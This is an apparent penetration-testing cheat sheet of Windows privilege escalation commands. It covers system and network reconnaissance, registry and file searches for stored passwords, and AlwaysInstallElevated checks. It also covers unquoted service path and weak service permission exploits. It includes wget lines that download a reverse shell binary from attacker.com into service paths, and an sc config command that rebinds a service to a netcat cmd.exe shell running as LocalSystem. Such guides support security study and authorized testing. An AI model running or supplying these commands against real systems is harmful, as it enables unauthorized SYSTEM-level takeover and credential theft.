# Windows Privilege Escalation

Windows privilege escalation commands.

Other guides just in case:
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
* http://www.fuzzysecurity.com/tutorials/16.html
* https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
* https://guif.re/windowseop?fbclid=IwAR0jmCV-uOLaUJCnKiGB2ZaDt9XZwlAGM3nTOH0GkS6c0hS63FFSGm97Tdc


### 1. SYSTEM INFORMATION + ACCOUNTS

```powershell
$ systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"Logon Server"
$ echo %username%         # current user
$ whoami                  # current user
$ set                     # env variables
$ net users               # return a list of all user accounts on the system
$ net user [user]         # return detailed info about a user
```

### 2. NETWORKING

```powershell
$ ipconfig /all           # show details for all network interfaces, physical and logical
$ route print             # show the routing table - set of rules to determine where packets will be directed
$ arp -A                  # show the ARP cache table - a cache of IP / unique MAC address pairs in a single LAN

$ netstat -ano                # show current TCP/IP network connections
$ netsh firewall show state   # show firewall state
$ netsh firewall show config  # show firewall configuration
```

### 3. WINDOWS TASKS

TAKE THE TIME TO INSPECT ALL BINPATHS FOR WINDOWS SERVICES, SCHEDULED TASKS AND STARTUP TASKS.
```powershell
$ schtasks /query /fo LIST /v   # show scheduled tasks (verbose)

$ tasklist /SVC                 # show running processes / associated services

$ net start                     # start Windows services

$ driverquery                   # show 3rd-party drivers

$ net user %username%           # show info about user
```

### 4. QUICK WINS

Missing Windows patches:
1. `wmic qfe get Caption,Description,HotFixID,InstalledOn` (mostly not available to non-admins)
2. Find Windows privesc exploits.
3. Grep for their existence in the output of `wmic` (using KB numbers)
4. If any exploits are missing from the patchlist, use them and profit.

Hardcoded redentials in config files:
```powershell
# LEVEL 1
$ type C:\sysprep.inf
$ type C:\sysprep\sysprep.xml
$ type %WINDIR%\Panther\Unattend\Unattended.xml
$ type %WINDIR%\Panther\Unattended.xml

# LEVEL 2
$ dir /s *pass* == *cred* == *vnc* == *.config*

# LEVEL 3 (.xml .ini .txt)
$ findstr /si password *.xml *.ini *.txt

# LEVEL 4 (in registry)
$ reg query HKLM /f password /t REG_SZ /s
$ reg query HKCU /f password /t REG_SZ /s
```

"AlwaysInstallElevated": this setting allows users of any priv to install .msi files as SYSTEM.
```powershell
# Output of both commands need to = 1
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```


### 5. WINDOWS SERVICES, FILE/FOLDER PERMISSIONS

For restarting services or binaries, try various methods to restart:  
__TRY TO REBOOT THE SYSTEM ITSELF VIA. CMD IF SERVICE RESTARTS DONT TRIGGER YOUR PAYLOAD__
```powershell
$ net start
$ sc start
$ mysql> RESTART;    # using service commands itself to restart
```

Unquoted service paths:  
A service is vulnerable path to the executable has a space in the filename and the file name is not wrapped in quote marks; exploitation requires write permissions to the path before the quote mark.
```powershell
# SCENARIO 1
$ wmic service get name,pathname        # Find possible vulnerable services
SERVICENAME           PATH
. . .                 . . .
PFNet                 C:\Program Files\Privacyware\PrivFirewall 7.0\pfw.exe
. . .                 . . .
$ wmic service get pathname,startname   # Check if service runs with Admin privileges
$ icacls/cacls service                  # Check for write permissions to folder: look for BUILTIN\USERS (W)
$ wget http://attacker.com/rshell.exe -O C:\Program Files (x86)\Privacyware\PrivFirewall.exe   # Transfer rshell to path
$ net start service / reboot computer

# SCENARIO 2: Writable C:\
$ wget http://attacker.com/rshell.exe -O C:\Program.exe
```

Unquoted service path guides:
* https://pentestlab.blog/2017/03/09/unquoted-service-path/
* https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
* https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/

Windows weak service permissions:
```powershell
$ sc qc [servicename]               # query service

$ accesschk.exe /accepteula         # DO THIS FIRST
$ accesschk.exe -ucqv UPNPHOST      # check required priv for every service using accesschk.exe
$ accesschk.exe -uwcqv "Authenticated Users" * # find services which allow access for "Authenticated Users"
```

Reconfigure Windows services to escalate privileges:
```powershell
$ sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc config upnphost obj= ".\LocalSystem" password= ""
$ net start upnphost
```

File and folder permissions:
* Look for weak permissions such as "NT AUTHORITY\AUTHENTICATED USERS: I M"
* For binaries that load with SYSTEM privileges, replace with your own binary.
```powershell
$ icacls [file or folder path]
$ cacls [file or folder path]
$ accesschk.exe -dqv [file or folder path]
```

Find all weak folder permissions per drive:
```powershell
$ echo Finding all weak folder permissions per drive
$ accesschk.exe -uwdqs Users c:\ /accepteula
$ accesschk.exe -uwdqs "Authenticated Users" c:\
```

Find all weak file permissions per drive:
```powershell
$ accesschk.exe -uwqs Users c:\*.* /accepteula
$ accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

Check PATH system variable:
* All non-default directories in root `C:\` will give WRITE access to the Authenticated Users group!!!
* Look for non-default dirs in `%path%`
